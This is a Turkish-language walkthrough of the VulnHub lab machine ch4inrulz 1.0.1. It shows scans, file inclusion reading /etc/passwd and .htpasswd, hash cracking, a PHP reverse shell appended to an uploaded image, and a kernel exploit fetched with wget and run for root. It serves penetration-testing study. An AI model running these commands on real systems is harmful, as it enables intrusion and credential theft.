# ch4inrulz: 1.0.1 WRITEUP

Merhabalar bu yazımda [ch4inrulz: 1.0.1](https://www.vulnhub.com/entry/ch4inrulz-101,247/) makinesimi patlatacağız.

## IP Adresi Keşfi

IP adresini tespit etmek için `netdiscover` aracını kullanabiliriz. Ben virtualboxtan IP aralıklarını bildiğim için bu aralıklarda tarama yapıyorum. Siz kendi sisteminize göre ayarlama yapabilirsiniz.

```text
root@kali:~# netdiscover -i eth1 -r  192.168.56.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
 192.168.56.100  08:00:27:92:dd:29      1      60  PCS Systemtechnik GmbH
 192.168.56.102  08:00:27:19:ef:74      1      60  PCS Systemtechnik GmbH
```

* `-i` interfaceyi belirtir.
* `-r` IP aralığını belirtir.

Bu andan itibaren makinemizin 192.168.56.102 IP adresini kullandığını biliyoruz.

## Nmap Taraması

Hızlı bir şekilde `-p` parametresi ile bütün portları taradım.

```text
root@kali:~# nmap 192.168.56.102 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-29 11:30 EST
Nmap scan report for 192.168.56.102
Host is up (0.00012s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8011/tcp open  unknown
MAC Address: 08:00:27:19:EF:74 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds
```

Ardıdan açık portlar üzerinde daha detaylı tarama yaptım.

```text
root@kali:~# nmap 192.168.56.102 -p 21,22,80,8011 -A -sS -sV -T4
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-29 11:32 EST
Nmap scan report for 192.168.56.102
Host is up (0.00094s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.56.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: FRANK's Website | Under development
8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:19:EF:74 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.19 - 2.6.36
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.94 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.28 seconds
```

Bu tarama ile birlikte portlar, servisler, sürümler ile ilgili daha fazla şey öğreniyoruz.

## Anonymous Ftp Denemesi

Nmap taramasından hemen anonymous ftp girişinin açık olduğunu görünce direk girmeyi denedim.

```text
root@kali:~# ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 2.3.5)
Name (192.168.56.102:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        111          4096 Apr 13  2018 .
drwxr-xr-x    2 0        111          4096 Apr 13  2018 ..
226 Directory send OK.
```

Fakat girdikten sonra içinde hiç bir şey olamdığını gördüm ve diğer portlara yönlendim.

## Web Serverlar ve Dirb

80 ve 8011 portlarından web servisi yayınlandığını biliyordum. Hemen tarayıcıdan ne var ne yok araştırmaya başladım.

![ch4inrulz-1](/Vulnhub/resimler/ch4inrulz:-1.0.1/ch4inrulz-1.png)

Basit bir cv sitesi. Kanak kodunu inceledikten sonrada bir şey çıkmadı. Ardından siteye `dirb` atmaya karar verdim.

```text
root@kali:~# dirb http://192.168.56.102/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Nov 29 11:48:45 2018
URL_BASE: http://192.168.56.102/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102/ ----
+ http://192.168.56.102/cgi-bin/ (CODE:403|SIZE:290)
==> DIRECTORY: http://192.168.56.102/css/
+ http://192.168.56.102/development (CODE:401|SIZE:481)
==> DIRECTORY: http://192.168.56.102/img/
+ http://192.168.56.102/index (CODE:200|SIZE:334)
+ http://192.168.56.102/index.html (CODE:200|SIZE:13516)
==> DIRECTORY: http://192.168.56.102/js/
+ http://192.168.56.102/LICENSE (CODE:200|SIZE:1093)
+ http://192.168.56.102/robots (CODE:200|SIZE:21)
+ http://192.168.56.102/robots.txt (CODE:200|SIZE:21)
+ http://192.168.56.102/server-status (CODE:403|SIZE:295)
==> DIRECTORY: http://192.168.56.102/vendor/

---- Entering directory: http://192.168.56.102/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Nov 29 11:48:47 2018
DOWNLOADED: 4612 - FOUND: 8
```

Bazı sayfalar ve dizinleri öğrenmiş olduk. Bu sayfaları tek tek sırayla gezdim.

* `/development` bu sayfa şifre korumalı. Şifreyi kaba kuvvetle bulabileceğimi düşündüm. Nede olsa kullanıcıyı tahmin edebiliyordum. `frank`. Sitenin giriş sayfasındaki adamın ismi. `nmap` script leri ve `hydra` ile saldırıdan sonra ve uzun uğraşlardan sonra bruteforce ile bir yere ulaşamadım.
* `/robots.txt` dosyasında hiç bir şey yok.
* Diğer dizinleri ve sayfaları dolaştıktan sonra bir şey çıkaramadım.

Bu başarısız girişimlerden sonra diğer porta yöneldim. 8011

Sayfaya girdiğimde "Development Server !" yazısından başka bir şey olmadığını gördüm ve burayıda `dirb` ile taradım.

```text
root@kali:~# dirb http://192.168.56.102:8011/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Nov 29 12:07:13 2018
URL_BASE: http://192.168.56.102:8011/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102:8011/ ----
==> DIRECTORY: http://192.168.56.102:8011/api/
+ http://192.168.56.102:8011/index.html (CODE:200|SIZE:30)
+ http://192.168.56.102:8011/server-status (CODE:403|SIZE:297)

---- Entering directory: http://192.168.56.102:8011/api/ ----
+ http://192.168.56.102:8011/api/index.html (CODE:200|SIZE:351)

-----------------
END_TIME: Thu Nov 29 12:07:18 2018
DOWNLOADED: 9224 - FOUND: 3
```

Buradan api sayfasını öğreniyor ve api sayfasına geçiyoruz.

Sayfayı açtığımızda yeni sayfalar için dosya isimleri ile karşılaşıyoruz. Ben sırayla hepsini denedikten sonra sadece `files_api.php` sayfasının bulunduğunu anlıyorum.

files_api sayfasına girdiğimde bana `file` parametresinin girilmediğini söylüyor. Ben de hemen url üzerinden `?file=/etc/passwd` denediğimde beni güzel bir espri ile karşılıyor :)

![ch4inrulz-2](/Vulnhub/resimler/ch4inrulz:-1.0.1/ch4inrulz-2.png)

Bende burada Local File Inclusion açığının bulunduğunu düşünerek [buradaki github sayfasındaki](https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion) tüm yöntemleri denedim. Buradan bir sonuca ulaşamadım.

Uzunca uğraştan ve araştırmadan sonra biraz yardım ile POST metodu kullanmam gerektiğini öğrendim. Bu işlem için python kullandım.

```text
root@kali:~# python3
Python 3.6.7 (default, Oct 22 2018, 11:32:17)
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> r = requests.post("http://192.168.56.102:8011/api/files_api.php", data={"file": "/etc/passwd"})
>>> print(r.text)

<head>
  <title>franks website | simple website browser API</title>
</head>

root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false

>>>
```

Ve işte passwd dosyası elimizde. Aynı yöntem ile başka dosyalarıda çekebiliriz.

## Daha Derinlemesine Dirb

Açıkçası bu adımda internetten biraz yardım (kopya) almam gerekti. Çünkü uzun bir çabadan sonra ne yapmam gerektiğini çözememiştim. Aslında cevap oldukça basitmiş. Şu şekilde:

```text
root@kali:~# dirb http://192.168.56.102/ /root/Downloads/SVNDigger/all.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Nov 29 12:50:39 2018
URL_BASE: http://192.168.56.102/
WORDLIST_FILES: /root/Downloads/SVNDigger/all.txt

-----------------

GENERATED WORDS: 43104

---- Scanning URL: http://192.168.56.102/ ----
. . . . .
. . . . .
. . . . .
+ http://192.168.56.102/index.html.bak (CODE:200|SIZE:334)
. . . . .
. . . . .
. . . . .
+ http://192.168.56.102/%%146^%%146134639^function.tpl.php (CODE:400|SIZE:306)
---- Entering directory: http://192.168.56.102/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.56.102/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Nov 29 12:51:29 2018
DOWNLOADED: 43104 - FOUND: 68
```

Benim daha önceki yaptığım `dirb` taramalarında kullandığım dirb programının varsayılan wordlisti idi. Bu taramada [şu adresteki](https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/) wordlistler ile daha fazla sayfa ve dizin araması yaparak taramayı geliştirdim. Bu sayede gödümden kaçan bazı önemli sayfaları buldum.

Bu sayfada "frank" kullanıcısına ait `.htpasswd` dosyasındaki kaydına ulaştım. `.htpasswd` dosyası apache sunucularda kullanıcıların yetkilendirilmesi ve doğrulanması için kullanılan bir dosyadır. Kullanıcı adları ve parolaların hashlenmiş hallerinin kayıtlarını tutar. İşte bende bu sayfada frank kullanıcısının `.htpasswd` dosyasındaki kaydına ulaştım.

Aslında biz `.htpasswd` dosyasına files_api.php sayfası üzerinden de ulaşabilirdik. aynen şu şekilde:

```text
root@kali:~# python3
Python 3.6.7 (default, Oct 22 2018, 11:32:17)
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> r = requests.post("http://192.168.56.102:8011/api/files_api.php", data={"file": "/etc/.htpasswd"})
>>> print(r.text)

<head>
  <title>franks website | simple website browser API</title>
</head>

frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0

>>>
```

Şu andan itibaren yapmamız gereken şey şifreyi kırmak. Bu işlem içinde `rohnny` (john the ripper gui) aracını kullanabiliriz.

`frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0` satırını bir dosyaya kaydettikten sonra dosyayı johnny ile açıyoruz. ardından şifre kırma işlemini başlatmamız yeterli.

![ch4inrulz-3](/Vulnhub/resimler/ch4inrulz:-1.0.1/ch4inrulz-3.png)

Artık frank kullanıcısının şifresini biliyoruz. `frank!!!` O zaman "development" sayfasına giriş yapabiliriz.

## Frank Olarak Sisteme Giriş

Sayfaya giriş yaptıktan sonda "uploader tool" un tamamlanmadığını söyleyen bir uyarı ile karşılaşıyoruz. Bende hemen "/development/uploader" sayfasını denedim ve sayfaya ulaştım.

Bu sayfada bir resim yükleme sayfası ile karşılaşıyoruz. Bize güvenlik testinin %50 sinin tamamlandığını söylüyor. Bu demek oluyor ki resim yükleyerek sisteme zararlı kod yükleyebiliriz.

Php de resimlerin içine php kodu eklendiğinde normal kodmuş gibi çalıştırılır. Eğer biş bu resmin sonuna reverse shell almak için kod eklersek resmi açmaya çalıştığımızda reverse shell alarak sisteme giriş yapabileceğiz. Ben reverse shell için [şu github sayfasındaki](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) kodu kullandım.

Bu kodda IP ve port bilgilerini kendi bilgisayarıma göre ayarladıktan sonra resmin sonuna şu şekilde yerleştiriyorum.

```text
root@kali:~# cat php-reverse-shell.php >> resim.png
```

Bu bash komutu ile php kodunu resmin sonuna eklemiş olduk. Artık yapmamız gereken şey kendi bilgisayarımızda gerekli portu dinlemeye almak ve resmi görüntülemek.

## Nerede Bu Resim Dizini

Bu kısım baya acı verici. Resimlerin yüklendiği dizini bulmak oldukça zor. Ben internetten araştırarak bulabildim.

Resimler `http://192.168.56.102/development/uploader/FRANKuploads/` dizinine yükleniyor. Buradan resmi görüntüleyerek reverse shellimizi alamıyoruz.

Ardından "files_api.php" sayfasından deniyorum. Evet bu sefer oldu. Reverse shellimizi aldık.

```text
root@kali:~# python3
Python 3.6.7 (default, Oct 22 2018, 11:32:17)
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> r = requests.post("http://192.168.56.102:8011/api/files_api.php", data={"file": "/var/www/development/uploader/FRANKuploads/resim.png"})

```

Burada da `nc` ile dinlemeye aldığım port:

```text
root@kali:~# nc -lvp 55555
Listening on [0.0.0.0] (family 0, port 55555)
Connection from 192.168.56.102 52018 received!
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 14:37:14 up  2:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$
```

Sırada frank kullanıcısının home dizinine gidip flagimizi alabiliriz.

```text
$ cd /home/frank
$ ls -al
total 36
drwxr-xr-x 3 frank frank 4096 Apr 14  2018 .
drwxr-xr-x 3 root  root  4096 Apr 13  2018 ..
-rw------- 1 frank frank   26 Jul 31 07:44 .bash_history
-rw-r--r-- 1 frank frank  220 Apr 13  2018 .bash_logout
-rw-r--r-- 1 frank frank 3353 Apr 13  2018 .bashrc
drwxr-xr-x 2 frank frank 4096 Apr 13  2018 .cache
-rw-r--r-- 1 frank frank  675 Apr 13  2018 .profile
-rw-r--r-- 1 frank frank    0 Apr 13  2018 .sudo_as_admin_successful
-rw-r--r-- 1 frank frank   29 Apr 14  2018 PE.txt
-rw-r--r-- 1 frank frank   33 Apr 14  2018 user.txt
$ cat user.txt
4795aa2a9be22fac10e1c25794e75c1b
```

Kullanıcı flagini aldık. Sırada root var.

## Root Flag Yolunda

Sistemin kernel sürümüne uygun exploit bulabileceğimi düşündüm.

```text
$ uname -a
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
```

İntenette ce exploit-db de araştırma ve bir kaç başarısız exploit denemesinden sonra [şu adresteki exploiti](https://github.com/lucyoa/kernel-exploits/blob/master/rds/rds64) denedim ve işe yaradı.

Exploiti indirip zafiyetli makineye gönderdim. Gönderme işlemi şu şekilde:

Kendi bilgisayarımdan basit bir http server başlattım

```text
root@kali:~# python -m SimpleHTTPServer 8001
Serving HTTP on 0.0.0.0 port 8001 ...
```

Ardından zafiyetli makineden bağlanıp exploiti indirdim:

```text
$ wget http://192.168.56.1:8001/rds64
--2018-11-29 14:51:25--  http://192.168.56.1:8001/rds64
Connecting to 192.168.56.1:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 694271 (678K) [application/octet-stream]
Saving to: `rds64'

     0K .......... .......... .......... .......... ..........  7% 4.24M 0s
    50K .......... .......... .......... .......... .......... 14% 49.2M 0s
   100K .......... .......... .......... .......... .......... 22% 39.6M 0s
   150K .......... .......... .......... .......... .......... 29% 37.0M 0s
   200K .......... .......... .......... .......... .......... 36% 46.6M 0s
   250K .......... .......... .......... .......... .......... 44% 66.1M 0s
   300K .......... .......... .......... .......... .......... 51% 58.2M 0s
   350K .......... .......... .......... .......... .......... 58% 3.85M 0s
   400K .......... .......... .......... .......... .......... 66% 43.0M 0s
   450K .......... .......... .......... .......... .......... 73% 82.2M 0s
   500K .......... .......... .......... .......... .......... 81% 85.0M 0s
   550K .......... .......... .......... .......... .......... 88%  330M 0s
   600K .......... .......... .......... .......... .......... 95%  790M 0s
   650K .......... .......... .......                         100%  690M=0.03s

2018-11-29 14:51:25 (20.1 MB/s) - `rds64' saved [694271/694271]
```

Geriye sadece çalıştırma yetkisi verip çalıştırmak kaldı.

```text
$ chmod +x rds64
$ ./rds64
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xffffffff81ce8df0
 [+] Resolved default_security_ops to 0xffffffff81a523e0
 [+] Resolved cap_ptrace_traceme to 0xffffffff8125db60
 [+] Resolved commit_creds to 0xffffffff810852b0
 [+] Resolved prepare_kernel_cred to 0xffffffff81085780
[*] Overwriting security ops...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xffffffff81ce8df0
 [+] Resolved default_security_ops to 0xffffffff81a523e0
 [+] Resolved cap_ptrace_traceme to 0xffffffff8125db60
 [+] Resolved commit_creds to 0xffffffff810852b0
 [+] Resolved prepare_kernel_cred to 0xffffffff81085780
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xffffffff81ce8df0
 [+] Resolved default_security_ops to 0xffffffff81a523e0
 [+] Resolved cap_ptrace_traceme to 0xffffffff8125db60
 [+] Resolved commit_creds to 0xffffffff810852b0
 [+] Resolved prepare_kernel_cred to 0xffffffff81085780
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
whoami
root
```

İşte sistemde artık root uz. Bundan sonra root dizinine gidip flagimizi alabiliriz.

```text
cd /root
ls -al
total 32
drwx------  4 root root 4096 Apr 14  2018 .
drwxr-xr-x 22 root root 4096 Apr 13  2018 ..
drwx------  2 root root 4096 Apr 13  2018 .aptitude
-rw-------  1 root root   82 Jul 31 07:44 .bash_history
-rw-r--r--  1 root root 3106 Apr 23  2010 .bashrc
drwxr-xr-x  2 root root 4096 Apr 14  2018 .cache
-rw-r--r--  1 root root  140 Apr 23  2010 .profile
-rw-r--r--  1 root root   33 Apr 14  2018 root.txt
cat root.txt
8f420533b79076cc99e9f95a1a4e5568
```

Bu makine beni bayaaaa zorladı fakat bi okadarda çok şey öğretti. Umarım faydalı olmuştur. Başarılar dilerim.
